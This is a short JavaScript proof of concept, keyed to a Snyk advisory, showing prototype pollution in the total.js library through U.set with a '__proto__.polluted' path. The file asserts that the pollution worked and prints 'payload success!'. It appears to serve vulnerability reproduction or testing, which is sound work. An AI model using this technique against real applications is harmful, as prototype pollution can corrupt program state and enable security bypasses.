//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
const total = require('total.js');
const { assert } = require("@firebase/util");

let obj = {};
console.log("Before : " + obj.polluted);
U.set({}, '__proto__.polluted', "yes");
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");